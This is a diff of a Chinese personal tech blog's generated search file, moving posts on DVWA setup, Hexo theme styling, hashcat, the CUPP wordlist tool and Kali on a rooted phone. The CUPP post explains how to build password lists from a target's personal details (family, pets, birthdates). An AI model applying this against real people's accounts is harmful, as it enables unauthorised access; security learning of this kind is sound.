-<h2 id="许可证"><a href="#许可证" class="headerlink" title="许可证"></a>许可证</h2><p>通过网上使用方法使用其他人的密钥发现导入无法使用，可能是方式有问题，我是用的镜像提供的命令导入密钥</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d --name dvwa -p 8080:80 -e RECAPTCHA_PUBLIC_KEY=YOUR_KEY -e RECAPTCHA_PRIVATE_KEY=YOUR_KEY sagikazarmark/dvwa</span><br></pre></td></tr></table></figure>
-
-<p>网上的使用方法<br>在DVWA-master&#x2F;config&#x2F;config.inc.php文件中找到下面代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_DVWA[ &#x27;recaptcha_public_key&#x27; ]  = &#x27; &#x27;;</span><br><span class="line">$_DVWA[ &#x27;recaptcha_private_key&#x27; ] = &#x27; &#x27;;</span><br></pre></td></tr></table></figure>
-<p>将其修改为：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_DVWA[ &#x27;recaptcha_public_key&#x27; ]  = &#x27;6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg&#x27;;</span><br><span class="line">$_DVWA[ &#x27;recaptcha_private_key&#x27; ] = &#x27;6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ&#x27;;</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>网络安全</category>
-        <category>dvwa</category>
-      </categories>
-      <tags>
-        <tag>docker</tag>
-        <tag>dvwa</tag>
       </tags>
   </entry>
   <entry>
@@ -793,45 +793,6 @@ the next reboot or after you run partprobe(8) or kpartx(8)
       </tags>
   </entry>
   <entry>
-    <title>hexo-butterfly美化</title>
-    <url>/2024/08/03/hexo-butterfly%E7%BE%8E%E5%8C%96/</url>
-    <content><![CDATA[<h2 id="hexo博客一图流"><a href="#hexo博客一图流" class="headerlink" title="hexo博客一图流"></a>hexo博客一图流</h2><h3 id="实现效果展示"><a href="#实现效果展示" class="headerlink" title="实现效果展示"></a>实现效果展示</h3><p>头部背景与主体部分背景无缝连接<br><img src="/images/pasted-22.png" alt="upload successful"></p>
-<h3 id="实现方法"><a href="#实现方法" class="headerlink" title="实现方法"></a>实现方法</h3><p>通过开启butterfly主题留下的inject模块功能</p>
-<h4 id="添加css代码"><a href="#添加css代码" class="headerlink" title="添加css代码"></a>添加css代码</h4><p>先在主题的css文件夹中创建custom.css文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd themes/butterfly/source/css/</span><br></pre></td></tr></table></figure>
-<p><img src="/images/pasted-24.png" alt="upload successful"></p>
-<p>编辑让顶部背景和页脚背景透明的css文件<br>vim custom.css</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#footer &#123;</span><br><span class="line">	background: transparent !important;</span><br><span class="line">&#125;</span><br><span class="line">#page-header &#123;</span><br><span class="line">   background: transparent !important;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#footer::before&#123;</span><br><span class="line">   background: transparent !important;</span><br><span class="line">&#125;</span><br><span class="line">#page-header::before&#123;</span><br><span class="line">   background: transparent !important;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[data-theme＝&quot;dark&quot;] #footer::before&#123;</span><br><span class="line">   background: transparent !important;</span><br><span class="line">&#125;</span><br><span class="line">[data-theme＝&quot;dark&quot;] #page-header::before&#123;</span><br><span class="line">   background: transparent !important;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h4 id="config-yml中开启inject部分功能"><a href="#config-yml中开启inject部分功能" class="headerlink" title="_config.yml中开启inject部分功能"></a>_config.yml中开启inject部分功能</h4><p>将head部分注释取消<br><img src="/images/pasted-23.png" alt="upload successful"></p>
-<h4 id="更换背景"><a href="#更换背景" class="headerlink" title="更换背景"></a>更换背景</h4><p>vim搜索背景，更换background</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /hexo/themes/butterfly/_config.yml</span><br></pre></td></tr></table></figure>
-<p><img src="/images/pasted-25.png" alt="upload successful"></p>
-<h3 id="效果实现"><a href="#效果实现" class="headerlink" title="效果实现"></a>效果实现</h3><h4 id="启动hexo查看效果"><a href="#启动hexo查看效果" class="headerlink" title="启动hexo查看效果"></a>启动hexo查看效果</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>
-<p>刷新页面<br><img src="/images/pasted-22.png" alt="upload successful"></p>
-<h2 id="文章封面"><a href="#文章封面" class="headerlink" title="文章封面"></a>文章封面</h2><h3 id="封面"><a href="#封面" class="headerlink" title="封面"></a>封面</h3><p>修改部分为：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim themes/butterfly/_config.yml</span><br><span class="line"></span><br><span class="line">cover:</span><br><span class="line">  #display the cover or not (是否顯示文章封面)</span><br><span class="line">  index_enable: false	#首页</span><br><span class="line">  aside_enable: false	#侧边</span><br><span class="line">  archives_enable: false#归档</span><br><span class="line">  #the position of cover in home page (封面顯示的位置)</span><br><span class="line">  #left/right/both</span><br><span class="line">  position: both</span><br><span class="line">  #When cover is not set, the default cover is displayed (當沒有設置cover時，默認的封面顯示)</span><br><span class="line">  default_cover: </span><br><span class="line">    # - https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg</span><br></pre></td></tr></table></figure>
-
-<h3 id="分页"><a href="#分页" class="headerlink" title="分页"></a>分页</h3><p>分页，也就是文章内中显示的下一页上一页按钮，可通过配置文章封面显示图片，也可以通过设置主题色改变其颜色。</p>
-<h2 id="置顶文章滚动页"><a href="#置顶文章滚动页" class="headerlink" title="置顶文章滚动页"></a>置顶文章滚动页</h2><h3 id="NPM-插件安装"><a href="#NPM-插件安装" class="headerlink" title="NPM 插件安装"></a>NPM 插件安装</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm i hexo-swiper-bar --save</span><br></pre></td></tr></table></figure>
-
-<h3 id="新增网站根目录-config-配置项-不是主题的"><a href="#新增网站根目录-config-配置项-不是主题的" class="headerlink" title="新增网站根目录_config 配置项 (不是主题的)"></a>新增网站根目录_config 配置项 (不是主题的)</h3><p>添加以下代码</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">swiper:</span><br><span class="line">  <span class="built_in">enable</span>: <span class="literal">true</span></span><br><span class="line">  priority: 2</span><br><span class="line">  enable_page: /</span><br><span class="line">  layout:</span><br><span class="line">    <span class="built_in">type</span>: <span class="built_in">id</span></span><br><span class="line">    name: recent-posts</span><br><span class="line">    index: 0</span><br><span class="line">  temple_html: <span class="string">&#x27;&lt;div class=&quot;recent-post-item&quot; style=&quot;height: auto;width: 100%&quot;&gt;&lt;div class=&quot;blog-slider swiper-container-fade swiper-container-horizontal&quot; id=&quot;swiper_container&quot;&gt;$&#123;temple_html_item&#125;&lt;/div&gt;&lt;/div&gt;&#x27;</span></span><br><span class="line">  plus_style: <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>相关含义小冰老师解释的很详细<br><a href="https://zfe.space/post/hexo-swiper.html">https://zfe.space/post/hexo-swiper.html</a></p>
-</blockquote>
-<h3 id="最后在文章中加入以下内容"><a href="#最后在文章中加入以下内容" class="headerlink" title="最后在文章中加入以下内容"></a>最后在文章中加入以下内容</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">swiper_index: 8</span><br><span class="line">swiper_desc: 简单好用的 hexo 博客文章置顶插件！</span><br><span class="line">swiper_cover: /images/letter/p.png</span><br></pre></td></tr></table></figure>
-<p>最后一行可不写，默认使用文章封面</p>
-<h2 id="主题色"><a href="#主题色" class="headerlink" title="主题色"></a>主题色</h2><p>修改以下内容即可</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim themes/butterfly/_config.yml</span><br><span class="line"></span><br><span class="line"> theme_color:</span><br><span class="line">   enable: true</span><br><span class="line">   main: &quot;#49B1F5&quot;</span><br><span class="line">   paginator: &quot;#00c4b6&quot;</span><br><span class="line">   button_hover: &quot;#FF7242&quot;</span><br><span class="line">   text_selection: &quot;#00c4b6&quot;</span><br><span class="line">   link_color: &quot;#99a9bf&quot;</span><br><span class="line">   meta_color: &quot;#858585&quot;</span><br><span class="line">   hr_color: &quot;#A4D8FA&quot;</span><br><span class="line">   code_foreground: &quot;#F47466&quot;</span><br><span class="line">   code_background: &quot;rgba(27, 31, 35, .05)&quot;</span><br><span class="line">   toc_color: &quot;#00c4b6&quot;</span><br><span class="line">   blockquote_padding_color: &quot;#49b1f5&quot;</span><br><span class="line">   blockquote_background_color: &quot;#49b1f5&quot;</span><br><span class="line">   scrollbar_color: &quot;#49b1f5&quot;</span><br><span class="line">   meta_theme_color_light: &quot;ffffff&quot;</span><br><span class="line">   meta_theme_color_dark: &quot;#0d0d0d&quot;</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>hexo博客</category>
-      </categories>
-      <tags>
-        <tag>博客</tag>
-        <tag>hexo</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>hashcat爆破压缩包</title>
     <url>/2025/02/26/hashcat%E7%88%86%E7%A0%B4%E5%8E%8B%E7%BC%A9%E5%8C%85/</url>
     <content><![CDATA[<h2 id="hashcat下载"><a href="#hashcat下载" class="headerlink" title="hashcat下载"></a>hashcat下载</h2><p>windows需要下载两个工具，一个<code>hashcat</code>，一个<code>John the Ripper</code>，下面是下载地址：</p>
@@ -895,6 +856,45 @@ the next reboot or after you run partprobe(8) or kpartx(8)
       <tags>
         <tag>网络安全</tag>
         <tag>hashcat</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>hexo-butterfly美化</title>
+    <url>/2024/08/03/hexo-butterfly%E7%BE%8E%E5%8C%96/</url>
+    <content><![CDATA[<h2 id="hexo博客一图流"><a href="#hexo博客一图流" class="headerlink" title="hexo博客一图流"></a>hexo博客一图流</h2><h3 id="实现效果展示"><a href="#实现效果展示" class="headerlink" title="实现效果展示"></a>实现效果展示</h3><p>头部背景与主体部分背景无缝连接<br><img src="/images/pasted-22.png" alt="upload successful"></p>
+<h3 id="实现方法"><a href="#实现方法" class="headerlink" title="实现方法"></a>实现方法</h3><p>通过开启butterfly主题留下的inject模块功能</p>
+<h4 id="添加css代码"><a href="#添加css代码" class="headerlink" title="添加css代码"></a>添加css代码</h4><p>先在主题的css文件夹中创建custom.css文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd themes/butterfly/source/css/</span><br></pre></td></tr></table></figure>
+<p><img src="/images/pasted-24.png" alt="upload successful"></p>
+<p>编辑让顶部背景和页脚背景透明的css文件<br>vim custom.css</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#footer &#123;</span><br><span class="line">	background: transparent !important;</span><br><span class="line">&#125;</span><br><span class="line">#page-header &#123;</span><br><span class="line">   background: transparent !important;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#footer::before&#123;</span><br><span class="line">   background: transparent !important;</span><br><span class="line">&#125;</span><br><span class="line">#page-header::before&#123;</span><br><span class="line">   background: transparent !important;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[data-theme＝&quot;dark&quot;] #footer::before&#123;</span><br><span class="line">   background: transparent !important;</span><br><span class="line">&#125;</span><br><span class="line">[data-theme＝&quot;dark&quot;] #page-header::before&#123;</span><br><span class="line">   background: transparent !important;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="config-yml中开启inject部分功能"><a href="#config-yml中开启inject部分功能" class="headerlink" title="_config.yml中开启inject部分功能"></a>_config.yml中开启inject部分功能</h4><p>将head部分注释取消<br><img src="/images/pasted-23.png" alt="upload successful"></p>
+<h4 id="更换背景"><a href="#更换背景" class="headerlink" title="更换背景"></a>更换背景</h4><p>vim搜索背景，更换background</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /hexo/themes/butterfly/_config.yml</span><br></pre></td></tr></table></figure>
+<p><img src="/images/pasted-25.png" alt="upload successful"></p>
+<h3 id="效果实现"><a href="#效果实现" class="headerlink" title="效果实现"></a>效果实现</h3><h4 id="启动hexo查看效果"><a href="#启动hexo查看效果" class="headerlink" title="启动hexo查看效果"></a>启动hexo查看效果</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>
+<p>刷新页面<br><img src="/images/pasted-22.png" alt="upload successful"></p>
+<h2 id="文章封面"><a href="#文章封面" class="headerlink" title="文章封面"></a>文章封面</h2><h3 id="封面"><a href="#封面" class="headerlink" title="封面"></a>封面</h3><p>修改部分为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim themes/butterfly/_config.yml</span><br><span class="line"></span><br><span class="line">cover:</span><br><span class="line">  #display the cover or not (是否顯示文章封面)</span><br><span class="line">  index_enable: false	#首页</span><br><span class="line">  aside_enable: false	#侧边</span><br><span class="line">  archives_enable: false#归档</span><br><span class="line">  #the position of cover in home page (封面顯示的位置)</span><br><span class="line">  #left/right/both</span><br><span class="line">  position: both</span><br><span class="line">  #When cover is not set, the default cover is displayed (當沒有設置cover時，默認的封面顯示)</span><br><span class="line">  default_cover: </span><br><span class="line">    # - https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg</span><br></pre></td></tr></table></figure>
+
+<h3 id="分页"><a href="#分页" class="headerlink" title="分页"></a>分页</h3><p>分页，也就是文章内中显示的下一页上一页按钮，可通过配置文章封面显示图片，也可以通过设置主题色改变其颜色。</p>
+<h2 id="置顶文章滚动页"><a href="#置顶文章滚动页" class="headerlink" title="置顶文章滚动页"></a>置顶文章滚动页</h2><h3 id="NPM-插件安装"><a href="#NPM-插件安装" class="headerlink" title="NPM 插件安装"></a>NPM 插件安装</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm i hexo-swiper-bar --save</span><br></pre></td></tr></table></figure>
+
+<h3 id="新增网站根目录-config-配置项-不是主题的"><a href="#新增网站根目录-config-配置项-不是主题的" class="headerlink" title="新增网站根目录_config 配置项 (不是主题的)"></a>新增网站根目录_config 配置项 (不是主题的)</h3><p>添加以下代码</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">swiper:</span><br><span class="line">  <span class="built_in">enable</span>: <span class="literal">true</span></span><br><span class="line">  priority: 2</span><br><span class="line">  enable_page: /</span><br><span class="line">  layout:</span><br><span class="line">    <span class="built_in">type</span>: <span class="built_in">id</span></span><br><span class="line">    name: recent-posts</span><br><span class="line">    index: 0</span><br><span class="line">  temple_html: <span class="string">&#x27;&lt;div class=&quot;recent-post-item&quot; style=&quot;height: auto;width: 100%&quot;&gt;&lt;div class=&quot;blog-slider swiper-container-fade swiper-container-horizontal&quot; id=&quot;swiper_container&quot;&gt;$&#123;temple_html_item&#125;&lt;/div&gt;&lt;/div&gt;&#x27;</span></span><br><span class="line">  plus_style: <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>相关含义小冰老师解释的很详细<br><a href="https://zfe.space/post/hexo-swiper.html">https://zfe.space/post/hexo-swiper.html</a></p>
+</blockquote>
+<h3 id="最后在文章中加入以下内容"><a href="#最后在文章中加入以下内容" class="headerlink" title="最后在文章中加入以下内容"></a>最后在文章中加入以下内容</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">swiper_index: 8</span><br><span class="line">swiper_desc: 简单好用的 hexo 博客文章置顶插件！</span><br><span class="line">swiper_cover: /images/letter/p.png</span><br></pre></td></tr></table></figure>
+<p>最后一行可不写，默认使用文章封面</p>
+<h2 id="主题色"><a href="#主题色" class="headerlink" title="主题色"></a>主题色</h2><p>修改以下内容即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim themes/butterfly/_config.yml</span><br><span class="line"></span><br><span class="line"> theme_color:</span><br><span class="line">   enable: true</span><br><span class="line">   main: &quot;#49B1F5&quot;</span><br><span class="line">   paginator: &quot;#00c4b6&quot;</span><br><span class="line">   button_hover: &quot;#FF7242&quot;</span><br><span class="line">   text_selection: &quot;#00c4b6&quot;</span><br><span class="line">   link_color: &quot;#99a9bf&quot;</span><br><span class="line">   meta_color: &quot;#858585&quot;</span><br><span class="line">   hr_color: &quot;#A4D8FA&quot;</span><br><span class="line">   code_foreground: &quot;#F47466&quot;</span><br><span class="line">   code_background: &quot;rgba(27, 31, 35, .05)&quot;</span><br><span class="line">   toc_color: &quot;#00c4b6&quot;</span><br><span class="line">   blockquote_padding_color: &quot;#49b1f5&quot;</span><br><span class="line">   blockquote_background_color: &quot;#49b1f5&quot;</span><br><span class="line">   scrollbar_color: &quot;#49b1f5&quot;</span><br><span class="line">   meta_theme_color_light: &quot;ffffff&quot;</span><br><span class="line">   meta_theme_color_dark: &quot;#0d0d0d&quot;</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>hexo博客</category>
+      </categories>
+      <tags>
+        <tag>博客</tag>
+        <tag>hexo</tag>
       </tags>
   </entry>
   <entry>
@@ -1128,6 +1128,37 @@ hydra -m cloud -P 密码字典 IP cisco-enable
       </tags>
   </entry>
   <entry>
+    <title>字典生成工具</title>
+    <url>/2025/02/21/kali-cupp%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7/</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>kali有很多字典生成工具，这里主要说cupp这个工具，他是一款社交工程学字典生成工具，可以根据目标用户的个人信息生成定制的密码字典，</p>
+<h2 id="cupp"><a href="#cupp" class="headerlink" title="cupp"></a>cupp</h2><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>输入命令根据提示输入提示词即可</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cupp -i</span><br></pre></td></tr></table></figure>
+
+<h3 id="翻译"><a href="#翻译" class="headerlink" title="翻译"></a>翻译</h3><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&gt; First Name: </span><br><span class="line">名字：目标的名字</span><br><span class="line">&gt; Surname: </span><br><span class="line">姓：目标的姓氏</span><br><span class="line">&gt; Nickname: </span><br><span class="line">昵称：目标的常用昵称或别名</span><br><span class="line">&gt; Birthdate (DDMMYYYY): </span><br><span class="line">出生日期：目标的出生日期，格式为日月年（DDMMYYYY）</span><br><span class="line">&gt; Partners) name:</span><br><span class="line">伴侣的名字</span><br><span class="line">&gt; Partners) nickname:</span><br><span class="line">伴侣的昵称：</span><br><span class="line">&gt; Partners) birthdate (DDMMYYYY):</span><br><span class="line">伴侣的出生日期（DDMMYYYY）</span><br><span class="line">&gt; Child&#x27;s name:</span><br><span class="line">孩子的名字：</span><br><span class="line">&gt; Child&#x27;s nickname:</span><br><span class="line">孩子的昵称：</span><br><span class="line">&gt; Child&#x27;s birthdate (DDMMYYYY):</span><br><span class="line">孩子的出生日期（DDMMYYYY）：</span><br><span class="line">&gt; Pet&#x27;s name:</span><br><span class="line">宠物的名字：</span><br><span class="line">&gt; Company name:</span><br><span class="line">公司名字：</span><br><span class="line">&gt; Do you want to add some key words about the victim? Y/[N]: y</span><br><span class="line">是否要添加一些关于目标的关键词？Y/[N]：y</span><br><span class="line">&gt; Please enter the words, separated by comma. [i.e. hacker,juice,black], spaces will be removed:</span><br><span class="line">请输入单词，用逗号分隔。[例如：hacker,juice,black]，空格将被移除：</span><br><span class="line">&gt; Do you want to add special chars at the end of words? Y/[N]: y</span><br><span class="line">是否要在单词末尾添加特殊字符？Y/[N]：y</span><br><span class="line">&gt; Do you want to add some random numbers at the end of words? Y/[N]:y</span><br><span class="line">是否要在单词末尾添加一些随机数字？Y/[N]：y</span><br><span class="line">&gt; Leet mode? (i.e. leet = 1337) Y/[N]:</span><br><span class="line">是否启用“Leet 模式”？（例如：leet = 1337）Y/[N]：</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>是否启用“Leet 模式”？（例如：leet &#x3D; 1337）<br>如果选择 Y，CUPP 会将单词中的某些字母替换为数字或特殊字符，以生成“Leet Speak”（1337 语言）。<br>例如：<br>a 替换为 4<br>e 替换为 3<br>i 替换为 1<br>o 替换为 0<br>s 替换为 5<br>t 替换为 7<br>例如，单词 password 会被替换为 p@ssw0rd 或 p@ssw0rd7 等。</p>
+</blockquote>
+<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="SocialEngineeringDictionaryGenerator"><a href="#SocialEngineeringDictionaryGenerator" class="headerlink" title="SocialEngineeringDictionaryGenerator"></a>SocialEngineeringDictionaryGenerator</h3><p>下载<code>index.html</code>打开即可使用；</p>
+<blockquote>
+<p>来自CN-SEC中文网:<br><a href="https://cn-sec.com/archives/2202717.html">https://cn-sec.com/archives/2202717.html</a></p>
+</blockquote>
+<blockquote>
+<p>项目地址：<br><a href="https://github.com/zgjx6/SocialEngineeringDictionaryGenerator">https://github.com/zgjx6/SocialEngineeringDictionaryGenerator</a></p>
+</blockquote>
+<div class="note red icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>注：工具仅供安全研究与学习之用，若将工具做其他用途，由使用者承担全部法律及连带责任，作者及发布者不承担任何法律及连带责任。</p>
+</div>]]></content>
+      <categories>
+        <category>网络安全</category>
+        <category>kali</category>
+        <category>命令</category>
+      </categories>
+      <tags>
+        <tag>kali</tag>
+        <tag>cupp</tag>
+        <tag>字典</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>java-linux安装卸载</title>
     <url>/2025/02/21/java-linux%E5%88%87%E6%8D%A2%E5%AE%89%E8%A3%85%E7%89%88%E6%9C%AC/</url>
     <content><![CDATA[<h2 id="下载jdk"><a href="#下载jdk" class="headerlink" title="下载jdk"></a>下载jdk</h2><ol>
@@ -1168,34 +1199,27 @@ hydra -m cloud -P 密码字典 IP cisco-enable
       </tags>
   </entry>
   <entry>
-    <title>字典生成工具</title>
-    <url>/2025/02/21/kali-cupp%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7/</url>
-    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>kali有很多字典生成工具，这里主要说cupp这个工具，他是一款社交工程学字典生成工具，可以根据目标用户的个人信息生成定制的密码字典，</p>
-<h2 id="cupp"><a href="#cupp" class="headerlink" title="cupp"></a>cupp</h2><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>输入命令根据提示输入提示词即可</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cupp -i</span><br></pre></td></tr></table></figure>
-
-<h3 id="翻译"><a href="#翻译" class="headerlink" title="翻译"></a>翻译</h3><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&gt; First Name: </span><br><span class="line">名字：目标的名字</span><br><span class="line">&gt; Surname: </span><br><span class="line">姓：目标的姓氏</span><br><span class="line">&gt; Nickname: </span><br><span class="line">昵称：目标的常用昵称或别名</span><br><span class="line">&gt; Birthdate (DDMMYYYY): </span><br><span class="line">出生日期：目标的出生日期，格式为日月年（DDMMYYYY）</span><br><span class="line">&gt; Partners) name:</span><br><span class="line">伴侣的名字</span><br><span class="line">&gt; Partners) nickname:</span><br><span class="line">伴侣的昵称：</span><br><span class="line">&gt; Partners) birthdate (DDMMYYYY):</span><br><span class="line">伴侣的出生日期（DDMMYYYY）</span><br><span class="line">&gt; Child&#x27;s name:</span><br><span class="line">孩子的名字：</span><br><span class="line">&gt; Child&#x27;s nickname:</span><br><span class="line">孩子的昵称：</span><br><span class="line">&gt; Child&#x27;s birthdate (DDMMYYYY):</span><br><span class="line">孩子的出生日期（DDMMYYYY）：</span><br><span class="line">&gt; Pet&#x27;s name:</span><br><span class="line">宠物的名字：</span><br><span class="line">&gt; Company name:</span><br><span class="line">公司名字：</span><br><span class="line">&gt; Do you want to add some key words about the victim? Y/[N]: y</span><br><span class="line">是否要添加一些关于目标的关键词？Y/[N]：y</span><br><span class="line">&gt; Please enter the words, separated by comma. [i.e. hacker,juice,black], spaces will be removed:</span><br><span class="line">请输入单词，用逗号分隔。[例如：hacker,juice,black]，空格将被移除：</span><br><span class="line">&gt; Do you want to add special chars at the end of words? Y/[N]: y</span><br><span class="line">是否要在单词末尾添加特殊字符？Y/[N]：y</span><br><span class="line">&gt; Do you want to add some random numbers at the end of words? Y/[N]:y</span><br><span class="line">是否要在单词末尾添加一些随机数字？Y/[N]：y</span><br><span class="line">&gt; Leet mode? (i.e. leet = 1337) Y/[N]:</span><br><span class="line">是否启用“Leet 模式”？（例如：leet = 1337）Y/[N]：</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>是否启用“Leet 模式”？（例如：leet &#x3D; 1337）<br>如果选择 Y，CUPP 会将单词中的某些字母替换为数字或特殊字符，以生成“Leet Speak”（1337 语言）。<br>例如：<br>a 替换为 4<br>e 替换为 3<br>i 替换为 1<br>o 替换为 0<br>s 替换为 5<br>t 替换为 7<br>例如，单词 password 会被替换为 p@ssw0rd 或 p@ssw0rd7 等。</p>
-</blockquote>
-<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="SocialEngineeringDictionaryGenerator"><a href="#SocialEngineeringDictionaryGenerator" class="headerlink" title="SocialEngineeringDictionaryGenerator"></a>SocialEngineeringDictionaryGenerator</h3><p>下载<code>index.html</code>打开即可使用；</p>
-<blockquote>
-<p>来自CN-SEC中文网:<br><a href="https://cn-sec.com/archives/2202717.html">https://cn-sec.com/archives/2202717.html</a></p>
-</blockquote>
-<blockquote>
-<p>项目地址：<br><a href="https://github.com/zgjx6/SocialEngineeringDictionaryGenerator">https://github.com/zgjx6/SocialEngineeringDictionaryGenerator</a></p>
-</blockquote>
-<div class="note red icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>注：工具仅供安全研究与学习之用，若将工具做其他用途，由使用者承担全部法律及连带责任，作者及发布者不承担任何法律及连带责任。</p>
-</div>]]></content>
+    <title>kali移动端（root安装，不改内核）</title>
+    <url>/2024/10/15/kali/</url>
+    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>把kali安在移动端，不论部署了什么工具和环境，可以随处携带，操作不方便可以局域网电脑远程使用、vnc等等。以上是我的使用场景也是折腾的原因。</p>
+<p>其实只有root的部分是最麻烦的，这个已经有很多教程了，可以慢慢看，建议先看手机的系统架构再看具体操作方法，不然在做什么都不知道。</p>
+<p>原理这块极客湾Geekerwan我感觉是说的很好的一个老师，视频链接放下面了<br>【玩机必看！带你入坑安卓刷机，小白也能看懂的ROOT基础指南来啦！】 <a href="https://www.bilibili.com/video/BV1BY4y1H7Mc/?share_source=copy_web&vd_source=772102c618b4c4a14c10923aa0e26404">https://www.bilibili.com/video/BV1BY4y1H7Mc/?share_source=copy_web&amp;vd_source=772102c618b4c4a14c10923aa0e26404</a></p>
+<h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><p>肯定是需要现有一部root的手机，这个可以看我oppo root的帖子或者网上找相应方法去操作。<br>然后能科学上网，这个其实没有也没关系，但是会比较方便。<br>使用的是面具安装。</p>
+<h2 id="下载镜像"><a href="#下载镜像" class="headerlink" title="下载镜像"></a>下载镜像</h2><p>bing搜索kali，点击下载</p>
+<p><img src="/images/pasted-64.png" alt="upload successful"></p>
+<p>点击移动端，mobile</p>
+<p><img src="/images/pasted-65.png" alt="upload successful"></p>
+<p>点击full的版本，因为我这个没有对应的手机，所以下载的是图中位置的镜像</p>
+<p><img src="/images/pasted-67.png" alt="upload successful"></p>
+<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>在面具里面点击图中的本地安装，找到下载的镜像包，安装就是了<br><img src="/images/pasted-70.png" alt="upload successful"></p>
+<p>安装之后其实一切都安装好了，据说官方支持的root机会自动下载好关键的三个软件，但是我这个瞎搞的root机，没有下载，后来发现官网下载镜像那里有个软件商店可以下载。<br><img src="/images/pasted-72.png" alt="upload successful"></p>
+]]></content>
       <categories>
-        <category>网络安全</category>
-        <category>kali</category>
-        <category>命令</category>
+        <category>手机搞机</category>
       </categories>
       <tags>
         <tag>kali</tag>
-        <tag>cupp</tag>
-        <tag>字典</tag>
+        <tag>手机root</tag>
       </tags>
   </entry>
   <entry>
@@ -1251,27 +1275,61 @@ hydra -m cloud -P 密码字典 IP cisco-enable
       </tags>
   </entry>
   <entry>
-    <title>kali移动端（root安装，不改内核）</title>
-    <url>/2024/10/15/kali/</url>
-    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>把kali安在移动端，不论部署了什么工具和环境，可以随处携带，操作不方便可以局域网电脑远程使用、vnc等等。以上是我的使用场景也是折腾的原因。</p>
-<p>其实只有root的部分是最麻烦的，这个已经有很多教程了，可以慢慢看，建议先看手机的系统架构再看具体操作方法，不然在做什么都不知道。</p>
-<p>原理这块极客湾Geekerwan我感觉是说的很好的一个老师，视频链接放下面了<br>【玩机必看！带你入坑安卓刷机，小白也能看懂的ROOT基础指南来啦！】 <a href="https://www.bilibili.com/video/BV1BY4y1H7Mc/?share_source=copy_web&vd_source=772102c618b4c4a14c10923aa0e26404">https://www.bilibili.com/video/BV1BY4y1H7Mc/?share_source=copy_web&amp;vd_source=772102c618b4c4a14c10923aa0e26404</a></p>
